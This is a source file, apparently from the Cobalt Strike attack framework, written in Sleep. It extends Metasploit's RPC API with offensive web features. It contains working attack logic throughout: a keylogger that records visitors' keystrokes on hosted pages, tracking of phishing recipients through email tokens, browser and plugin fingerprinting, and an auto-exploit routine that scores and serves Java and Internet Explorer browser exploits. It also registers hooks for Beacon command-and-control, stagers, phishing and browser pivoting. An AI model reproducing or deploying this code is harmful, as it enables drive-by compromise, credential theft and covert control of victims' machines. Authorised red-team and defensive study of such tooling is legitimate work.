# Implement code that extends Metasploit's RPC API with CloudStrike specific
# goodies. This code has its own global variables and executes in its own Sleep
# environment. | In a sense, it really is a separate program in terms of isolation

import profiler.*;
import cloudstrike.*;

# call, @(port, "/", [redirect])
sub api_start_profiler {
	local('$port $redirect $server $url $profiler $exception $desc $java');
	($port, $url, $redirect, $desc, $java) = $2;

	try {
		if ($port !in %servers) {
			%servers[$port] = [new WebServer: int($port)];
			[%servers[$port] addWebListener: &serverHit];
		}
		$server = %servers[$port];

		if ($redirect) {
			$profiler = [new SystemProfiler: $redirect, $desc, $java];
		}
		else {
			$profiler = [new SystemProfiler: $desc, $java];
		}

		setupProfiler($profiler);
		[$profiler setup: $server, $url];
	}
	catch $exception {
		println($exception);
		printAll(getStackTrace());
		return %(status => "failed: " . [$exception getMessage]);
	}

	return %(status => "success");
}

sub refreshIds {
	local('@data $data %r');
	@data = values(data_list("cloudstrike.sent_mail"));
	foreach $data (@data) {
		%r[$data['token']] = $data['to'];
	}
	return %r;
}

sub resolveId {
	if (strlen($1) == 12 && $1 !in %idcache) {
		%idcache = refreshIds();
	}

	if ($1 in %idcache) {
		return %idcache[$1];
	}
	return $1;
}

sub fixCookie {
	if ($1 ismatch '.*?session=(.{36}).*') {
		return matched()[0];
	}
	return $1;
}

sub serverHit {
	local('$uri $method $header $params $handler $addr $date $action $ua $resp $size $primary $value $key $val @z $id $cookie');
	($uri, $method, $header, $params, $handler, $primary, $resp, $size) = convertAll(@_);
	$addr    = substr($header['REMOTE_ADDRESS'], 1);
	$date    = formatDate('HH:mm:ss');
	$ua      = $header['User-Agent'];
	$handler = ["$handler" trim];
	$id      = $params['id'] . "";
	$cookie  = fixCookie($header['Cookie']); # associate $id with this so we can cross-reference profiles and stuff with users...

	if (strlen($id) == 12 && $id !in %idcache) {
		%idcache = refreshIds();
	}
	else if ($cookie in %cookie && %cookie[$cookie] in %idcache) {
		$id = %cookie[$cookie];
	}

	# fix the handler description
	@z = split(' ', $handler);
	if (size(@z) > 1) {
		shift(@z);
		$handler = join(' ', @z);
	}

	$value  = "$date visit from: $addr";
	if ($id in %idcache) {
		$value .= " (" . %idcache[$id] . ")\n";
		if ($cookie ne "") {
			%cookie[$cookie] = $id;
		}
	}
	else {
		$value .= "\n";
	}
	$value .= "\tRequest: $method $uri $+ \n";

	if ($handler ne "") {
		$value .= "\t $+ $handler $+ \n";
	}
	else {
		$value .= "\tResponse: $resp $+ \n";
	}

	$value .= "\t $+ $ua $+ \n";

	if (size($params) > 0) {
		$value .= "\t= Form Data =\n";
		foreach $key => $val ($params) {
			$val = strrep($val, "\n", '\\n'); 
			$value .= "\t $+ $[10]key = $val $+ \n"; 
		}
	}

	if ("Serves*beacon*.dll" !iswm $handler) {
		# post to a weblog that we will do something with later...
		data_add_async('cloudstrike.weblog', %(host => $addr, uri => $uri, handler => $handler, response => $resp, created_at => ticks(), size => $size, user-agent => $ua, method => $method, token => $id, primary => $primary));
	}

	if ($primary) {
		if ($id in %idcache) {
			call_async($client, "db.log_event", "$addr $+ //www", %idcache[$id] . " visited $uri ( $+ $handler $+ )");
		}
		else {
			call_async($client, "db.log_event", "$addr $+ //www", "user visited $uri ( $+ $handler $+ )");
		}
	}

	[$webevents put: "$value $+ \n"];
}

sub setupKeylogger {
	[$1 addKeyloggerListener: lambda({
		local('$date $options $user $d $r $f $id $cookie $data');
 		$date = formatDate('yyyy-MM-dd HH:mm:ss Z');
		$options = convertAll($3);
		$data = split(',', $options['data']);
		foreach $d ($data) {
			if ($d eq '8') {
				$r .= '<DEL>';
			}
			else if ($d eq '9') {
				$r .= '<TAB>';
			}
			else if ($d eq '13' || $d eq '10') {
				$r .= '<ENTER>';
			}
			else if ($d ne "") {
				$f = chr(formatNumber($d, 16, 10));
				$r .= $f;
			}
		}
		
		[$webevents put: "[+] $2 [" . resolveId($4) . "] Keys $curl $+ : $r $+ \n"];
		data_add_async("cobaltstrike.key_strokes", %(local => $1, host => $2, site => $curl, data => $r, date => $date, created_at => ticks(), token => $4));
	}, $curl => $2)];
}

# guess the update level for an application...
sub mapSoftwareToReleaseDate {
	local('%dates');
	%dates = ohash();
	setMissPolicy(%dates, {
		return 0L;
	});

	local('$handle $version $date $temp');
	$handle = [SleepUtils getIOHandle: resource($1), $null];
	while $temp (readln($handle)) {
		($version, $date) = split('\t+', $temp);
		%dates[$version] = long($date);
	}
	return %dates;
}

sub setupExploit {
	[$1 setExploitListener: lambda({
		# a few mods to our exploit/score list [based on self-hosted stuff]
		%exploits["default"]                                    = "/a/applet.html";
		%exploits["multi/browser/java_rhino"]                   = "/b/applet.html";
		%exploits["multi/browser/java_jre17_provider_skeleton"] = "/b/applet.html";

		# adjust exploit priorities based on whether Java was able to run or not
		if ($5 eq "undefined") {
			# if $4 eq undefined, then we were unable to run an applet to determine IP... this means these options
			# will probably fail too...
			%scores["multi/browser/java_rhino"]                     = 1;
			%scores["multi/browser/java_jre17_provider_skeleton"]   = 1;
		}
		else {
			# if we could run an applet to determine IP AND the user is running a vulnerable Java
			# then we want to use one of these exploits... they're money.
			%scores["multi/browser/java_rhino"]                     = 920121212; 
			%scores["multi/browser/java_jre17_provider_skeleton"]   = 920130401;
		}

		local('$handle @data $date $app $ver $apps $level $temp $os $flavor $record @apps @attacks %meta $a $attack $b');
		$apps = convertAll($3);

		# determine the operating system so we can tag each app with it
		$os = "unknown";
		foreach $app => $ver ($apps) {
			if ("*Windows*" iswm $app && $ver eq "") {
				$os = "windows";
			}
			else if ("*Mac*iPad*" iswm $app || "*Mac*iPhone*" iswm $app || "*Mac*iPod*" iswm $app) {
				$os = "osx";
			}
			else if ("*Mac*OS*X*" iswm $app) {
				$os = "osx";
			}
			else if ("*Linux*" iswm $app) {
				$os = "linux";
			}
			else if ("*Android*" iswm $app) {
				$os = "linux";
			}
		}

		# loop through the applications
		foreach $app => $ver ($apps) {
			if ($app eq "Internet Explorer") {
				# let's guess the system patch level
				$level = %ie[$ver];

				if ('Windows Media Player' in $apps) {
					$temp = %wm[$apps['Windows Media Player']];
					if ($temp > $level) {
						$level = $temp;
					}
				}

				if ('JScript' in $apps) {
					$temp = %js[$apps['JScript']];
					if ($temp > $level) {
						$level = $temp;
					}
				}
			}
			else {
				$level = 0L;
			}

			foreach $attack (findExploits($app, $ver, $level, $os, $always => 1)) {
				push(@attacks, $attack);
				if ($level > 0L) {
					%meta[$attack] = "$app $ver $level";
				}
				else {
					%meta[$attack] = "$app $ver";
				}
			}
		}

		# do a little fudging...
		if ("Windows 7" in $apps || "Windows Vista" in $apps) {
			# these exploits require Java 1.6 for ROP. If it's not present, then we lose.
			if ("1.6.*" !iswm $apps['Java']) {
				remove(@attacks, 'windows/browser/msxml_get_definition_code_exec');
				remove(@attacks, 'windows/browser/ie_execcommand_uaf');
			}
		}

		# resolve the highest scoring exploit from our list...
		local('$url $score');
		$url   = %exploits["default"];
		$score = 0;
		$a     = "no exploit matches";
		$b     = "signed applet";

		foreach $attack (@attacks) {
			if ($attack in %exploits && %scores[$attack] > $score) {
				$score = %scores[$attack];
				$url   = %exploits[$attack];
				$a     = "target: " . %meta[$attack];
				$b     = "$attack";
			}
		}

		# report the goodness....
		[$webevents put: "[+] Sent a guided missile to $1 $+ : $b ( $+ $a $+ )\n\n"];
		if (function('&event')) {
			event("* send $1 to $url $+ : $b ( $+ $a $+ )\n");
		}
		call_async($client, "db.log_event", "$1 $+ //www", "auto-exploit $url $+ : $b ( $+ $a $+ )");
		return $url;
	}, %exploits => convertAll($2), %scores => convertAll($3))];
}


sub setupProfiler {
	[$1 addProfileListener: {
		local('$handle @data $date $app $ver $apps $level $temp $os $flavor $record');
		$apps = convertAll($4);

		# Windows x64 Java will report internal address as 127.0.0.1; adjust it to unknown to fix logic
		if ($2 eq "127.0.0.1") {
			$2 = "unknown";
			[$webevents put: "[*] $1 applet ran, but reported 127.0.0.1 as address. Reporting internal address as unknown\n"];
		}

		# determine the operating system so we can tag each app with it
		$os = "unknown";
		foreach $app => $ver ($apps) {
			if ("*Windows*" iswm $app && $ver eq "") {
				$os = "windows";
				($null, $flavor) = split(' ', $app);
				cmd_safe("hosts -a $1" . iff($2 ne "unknown", " $2"), lambda({
					if ($internal ne "unknown" && $external ne $internal) {
						call_async($mclient, "db.report_host", %(host => $internal, os_name => "Microsoft Windows", os_flavor => $flavor));
						call_async($mclient, "db.report_host", %(host => $external, purpose => "firewall"));
					}
					else {
						call_async($mclient, "db.report_host", %(host => $external, os_name => "Microsoft Windows", os_flavor => $flavor));
					}
				}, \$flavor, $external => $1, $internal => $2));
			}
			else if ("*Mac*iPad*" iswm $app || "*Mac*iPhone*" iswm $app || "*Mac*iPod*" iswm $app) {
				$os = "osx";
				cmd_safe("hosts -a $1" . iff($2 ne "unknown", " $2"), lambda({
					if ($internal ne "unknown" && $external ne $internal) {
						call_async($mclient, "db.report_host", %(host => $internal, os_name => "Apple iOS"));
						call_async($mclient, "db.report_host", %(host => $external, purpose => "firewall"));
					}
					else {
						call_async($mclient, "db.report_host", %(host => $external, os_name => "Apple iOS"));
					}
				}, $external => $1, $internal => $2));
			}
			else if ("*Mac*OS*X*" iswm $app) {
				$os = "osx";
				cmd_safe("hosts -a $1" . iff($2 ne "unknown", " $2"), lambda({
					if ($internal ne "unknown" && $external ne $internal) {
						call_async($mclient, "db.report_host", %(host => $internal, os_name => "Apple Mac OS X"));
						call_async($mclient, "db.report_host", %(host => $external, purpose => "firewall"));
					}
					else {
						call_async($mclient, "db.report_host", %(host => $external, os_name => "Apple Mac OS X"));
					}
				}, $external => $1, $internal => $2));
			}
			else if ("*Linux*" iswm $app) {
				$os = "linux";
				cmd_safe("hosts -a $1" . iff($2 ne "unknown", " $2"), lambda({
					if ($internal ne "unknown" && $external ne $internal) {
						call_async($mclient, "db.report_host", %(host => $internal, os_name => "Linux"));
						call_async($mclient, "db.report_host", %(host => $external, purpose => "firewall"));
					}
					else {
						call_async($mclient, "db.report_host", %(host => $external, os_name => "Linux"));
					}
				}, $external => $1, $internal => $2));
			}
			else if ("*Android*" iswm $app) {
				$os = "linux";
				cmd_safe("hosts -a $1" . iff($2 ne "unknown", " $2"), lambda({
					if ($internal ne "unknown" && $external ne $internal) {
						call_async($mclient, "db.report_host", %(host => $internal, os_name => "Android"));
						call_async($mclient, "db.report_host", %(host => $external, purpose => "firewall"));
					}
					else {
						call_async($mclient, "db.report_host", %(host => $external, os_name => "Android"));
					}
				}, $external => $1, $internal => $2));
			}
		}

		# report unknown hosts anyways...
		if ($os eq "unknown") {
			cmd_safe("hosts -a $1" . iff($2 ne "unknown", " $2"), lambda({
				if ($internal ne "unknown" && $external ne $internal) {
					call_async($mclient, "db.report_host", %(host => $external, purpose => "firewall"));
				}
			}, $external => $1, $internal => $2));
		}

		# blah blah blacksheep!
		$record = "[+] $1 $+ / $+ $2 [" . resolveId($5) . "] Applications";

		# record the applications...
		$date = formatDate('yyyy-MM-dd HH:mm:ss Z');
		foreach $app => $ver ($apps) {
			if ($app eq "Internet Explorer") {
				# let's guess the system patch level
				$level = %ie[$ver];

				if ('Windows Media Player' in $apps) {
					$temp = %wm[$apps['Windows Media Player']];
					if ($temp > $level) {
						$level = $temp;
					}
				}

				if ('JScript' in $apps) {
					$temp = %js[$apps['JScript']];
					if ($temp > $level) {
						$level = $temp;
					}
				}
			}
			else {
				$level = 0L;
			}

			$record .= "\n\t $+ $[25]app $ver";
			data_add_async("cloudstrike.client_profiles", %(external => $1, internal => $2, application => $app, version => $ver, date => $date, created_at => ticks(), token => $5, level => $level, os => $os));
		}
	
		[$webevents put: "$record $+ \n\n"];
		if (function('&event')) {
			event("* Received profile from $1 (" . size($apps) . " applications)\n");
		}
		call_async($client, "db.log_event", "$1 $+ //www", "received system profile (" . size($apps) . " applications)");
	}];
}

sub api_list_sites {
	local('$port $site $server @s @r %temp');
	foreach $port => $server (%servers) {
		@s = convertAll([$server sites]);
		foreach $site (@s) {
			$site['Port'] = $port;
			push(@r, $site);
		}
	}
	return @r;
}

# call, @(port, "URI")
sub api_kill_site {
	local('$port $uri $server $s $w $j');
	($port, $uri) = $2;
	if ($port in %servers) {
		$server = %servers[$port];
		$w = [$server get: $uri];
		$s = [$server deregister: $uri];
		if ($s) {
			%servers[$port] = $null;
		}

		$j = convertAll([$w cleanupJobs]);
		map({ call_async($client, "job.stop", $1); }, $j);
	}
	return %(status => "success");
}

# call, @(port, "/", "content")
sub api_host_site {
	local('$port $content $server $desc $curl $url $hook $exception $capture');
	($port, $url, $content, $capture, $desc, $curl) = $2;

	try {
		if ($capture) {
			$hook = [new Keylogger: $content, "text/html", $desc];
			setupKeylogger($hook, $curl);
		}
		else {
			$hook = [new StaticContent: $content, "text/html", $desc];
		}

		if ($port !in %servers) {
			%servers[$port] = [new WebServer: int($port)];
			[%servers[$port] addWebListener: &serverHit];
		}
		$server = %servers[$port];
		[$hook setup: $server, $url];
	}
	catch $exception {
		println($exception);
		printAll(getStackTrace());
		return %(status => "failed: " . [$exception getMessage]);
	}

	return %(status => "success");
}

# call, @(port, "/", "content", "mime type")
sub api_host_file {
	local('$port $url $resource $type $hook $server $exception');
	($port, $url, $resource, $type) = $2;

	# sanity checks
	if (!-exists $resource) {
		return %(status => "Failed: File ' $+ $resource $+ ' does not exist.\nI can't host it.");
	}
	else if (!-canread $resource) {
		return %(status => "Failed: I can't read the file. How can I serve it?");
	}

	try {
		$hook = [new ServeFile: [new java.io.File: $resource], $type];

		if ($port !in %servers) {
			%servers[$port] = [new WebServer: int($port)];
			[%servers[$port] addWebListener: &serverHit];
		}
		$server = %servers[$port];
		[$hook setup: $server, $url];
	}
	catch $exception {
		println($exception);
		printAll(getStackTrace());
		return %(status => "failed: " . [$exception getMessage]);
	}

	return %(status => "success");
}

# call, @(port, "/", "content", "mime type")
sub api_host_data {
	local('$port $uri $data $type $desc $hook $server $exception');
	($port, $uri, $data, $type, $desc) = $2;

	try {
		$hook = [new StaticContent: $data, $type, $desc];

		if ($port !in %servers) {
			%servers[$port] = [new WebServer: int($port)];
			[%servers[$port] addWebListener: &serverHit];
		}
		$server = %servers[$port];
		[$hook setup: $server, $uri];
	}
	catch $exception {
		println($exception);
		printAll(getStackTrace());
		return %(status => "failed: " . [$exception getMessage]);
	}

	return %(status => "success");
}

# call, @(port, "/", "applet.jar raw data", "base64 encoded win payload", "libs.jar raw data")
sub api_host_applet {
	local('$port $uri $applet $windows $java $hook $server $exception $class $title');
	($port, $uri, $applet, $windows, $java, $class, $title) = $2;

	try {
		$hook = [new ServeApplet: cast($applet, 'b'), $windows, cast($java, 'b'), $title, $null];

		if ($port !in %servers) {
			%servers[$port] = [new WebServer: int($port)];
			[%servers[$port] addWebListener: &serverHit];
		}
		$server = %servers[$port];
		[$hook setup: $server, $uri, $class];
	}
	catch $exception {
		println($exception);
		printAll(getStackTrace());
		return %(status => "failed: " . [$exception getMessage]);
	}

	return %(status => "success");
}

# call, @(port, url, exploits, jobs)
sub api_auto_exploit {
	local('$port $url %exploits %scores $jobs $server $hook $exception $wdata $jdata $classa $jara $classb $jarb');
		# call($mclient, "cloudstrike.auto_exploit", %options["Port"], %options["URIPATH"], join(" ", @new), %exploits, %scores)

	($port, $url, $jobs, %exploits, %scores, $wdata, $jdata, $classa, $jara, $classb, $jarb) = convertAll($2);

	try {
		if ($port !in %servers) {
			%servers[$port] = [new WebServer: int($port)];
			[%servers[$port] addWebListener: &serverHit];
		}
		$server = %servers[$port];

		$hook = [new AutoExploit: $jobs, $classa, $jara, $classb, $jarb];
		setupProfiler($hook);
		setupExploit($hook, %exploits, %scores);
		[$hook setup: $server, $url, $wdata, $jdata];
	}
	catch $exception {
		println($exception);
		printAll(getStackTrace());
		return %(status => "failed: " . [$exception getMessage]);
	}

	return %(status => "success");
}

sub api_web_poll {
	local('$id');
	$id = [[Thread currentThread] hashCode] . "";
	return %(data => [$webevents get: $id], prompt => "");
}

sub api_read_buffer {
	local('$data $bid $prompt');
	($bid) = $2;
	if ($bid !in %buffers) {
		print_error("Telling the console client to go away...");
		return %(data => "", result => "failure");
	}
	$data   = [%buffers[$bid] get: "foo"];
	$prompt = [%buffers[$bid] getPrompt];
	return %(data => $data, prompt => $prompt);
}

sub api_release_buffer {
	local('$bid');
	($bid) = $2;
	%buffers[$bid] = $null;
	return %();
}

sub my_ip {
	if ($client !is $mclient) {
		return call($mclient, "armitage.my_ip")['result'];
	}
	else {
		return $MY_ADDRESS;
	}
}

# check if a port is available or not.
sub api_listener_sanity {
	local('$host $port $ex $handle $name $payload $x');
	($host, $port, $name, $payload) = $2;
	try {
		# cobalt strike holds this port... and the user wants a cobalt strike listener... this is OK
		if ($port in %servers && "windows/beacon*/*" iswm $payload) {
			return %(status => "good");
		}

		# try an HTTP listener once... I believe it when it says it's not going away
		if ("*http*" iswm $payload) {
			$handle = connect("127.0.0.1", $port);
			closef($handle);
		}
		else {
			# connect to the port 5 times... to verify that it's definitely not going away
			for ($x = 0; $x < 5; $x++) {
				$handle = connect("127.0.0.1", $port);
				closef($handle);
				sleep(1000);
			}
		}
		call($mclient, "armitage.publish", "listener_log", "$name may fail - port $port in use before (re)start\n");
		print_error("Listener $name may fail - port $port in use before (re)start");
		return %(status => "error");
	}
	catch $ex {
		return %(status => "good");
	}
}

sub init_cloudstrike_hooks {
	#
	# add all of our hooks in a separate thread so we don't create any deadlock 
	# issues. These extra API items should be pretty isolated from the rest of
	# CloudStrike anyways...
	#
	global('$events $downloaddir');

	#
	if (function('&downloadDirectory') !is $null) {
		$downloaddir = downloadDirectory();
	}
	else {
		$downloaddir = "downloads/";
	}

	wait(fork({
		debug(7 | 34); # we throw exceptions here....

		global('%servers $webevents %idcache %cookie %ie %wm %js %vpn %tap %srv $dns %buffers %socks %bpivots %pipes %bartifacts %seen %bdlls');

		# a place to store web events for all clients to query...
		$webevents = [new armitage.ArmitageBuffer: 8192];
	
		# release dates for Internet Explorer
		%ie = mapSoftwareToReleaseDate("resources/iedates.txt");

		# release dates for Windows Media Player
		%wm = mapSoftwareToReleaseDate("resources/wmplayer.txt");

		# release dates for Jscript.dll (MS JavaScript engine)
		%js = mapSoftwareToReleaseDate("resources/jscript.txt");

		# load our default profile
		if ($c2profile is $null) {
			$c2profile = [c2profile.Loader LoadDefaultProfile];
		}

		# allow a user's client to query the User-Agent it should send
		[$client addHook: "cloudstrike.useragent", &api_random_useragent];

		[$client addHook: "cloudstrike.listener_sanity", &api_listener_sanity];
		[$client addHook: "cloudstrike.start_profiler", &api_start_profiler];
		[$client addHook: "cloudstrike.host_site",   &api_host_site];
		[$client addHook: "cloudstrike.host_file",   &api_host_file];
		[$client addHook: "cloudstrike.host_data",   &api_host_data];
		[$client addHook: "cloudstrike.host_applet", &api_host_applet];
		[$client addHook: "cloudstrike.sign_jar",    &api_sign_jar];
		[$client addHook: "cloudstrike.auto_exploit", &api_auto_exploit];
		[$client addHook: "cloudstrike.list_sites", &api_list_sites];
		[$client addHook: "cloudstrike.kill_site", &api_kill_site];
		[$client addHook: "cloudstrike.web_poll", &api_web_poll];

		# start beacon server. Here because... the beacon server uses the webserver
		[$client addHook: "cloudstrike.start_beacon", &api_start_beacon];
		[$client addHook: "cloudstrike.start_beacon_smb", &api_start_beacon_smb];
		[$client addHook: "beacon.pivot", &api_beacon_pivot];
		[$client addHook: "beacon.pivot_once", &api_beacon_pivot_once];
		[$client addHook: "beacon.unlink", &api_beacon_unlink];
		[$client addHook: "beacon.remove2", &api_beacon_remove2];
		[$client addHook: "cloudstrike.stop_beacon",  &api_stop_beacon];
		[$client addHook: "beacon.host_stager", &api_host_beacon_stager];

		# code to download Beacon stages
		[$client addHook: "beacon.list_stages", &api_stage_list_beacon];
		[$client addHook: "beacon.get_stage", &api_stage_beacon];
		[$client addHook: "beacon.get_dll", &api_get_beacon_dll];

		# buffer API
		[$client addHook: "cloudstrike.buffer_read",    &api_read_buffer];
		[$client addHook: "cloudstrike.buffer_release", &api_release_buffer];
		[$client addHook: "cloudstrike.go_phish",       &api_go_phish];
		[$client addHook: "cloudstrike.preview_phish",  &api_preview_phish];

		# Browser Pivoting API
		[$client addHook: "browserpivot.start", &api_browserpivot_start];
		[$client addHook: "browserpivot.stop", &api_browserpivot_stop];

		# CovertVPN API... located here because the HTTP channel uses the
		# Cobalt Strike webserver
		[$client addHook: "cloudstrike.start_tap", &api_start_tap];
		[$client addHook: "cloudstrike.stop_tap", &api_stop_tap];
		[$client addHook: "cloudstrike.list_taps", &api_list_taps];
		[$client addHook: "cloudstrike.query_tap", &api_query_tap];
		[$client addHook: "cloudstrike.export_tap_client", &api_export_tap];
		[$client addHook: "cloudstrike.set_tap_hwaddr", &api_hwaddr_tap];
	}, \$client, $mclient => $client, \$events, \$downloaddir, \$c2profile));
}
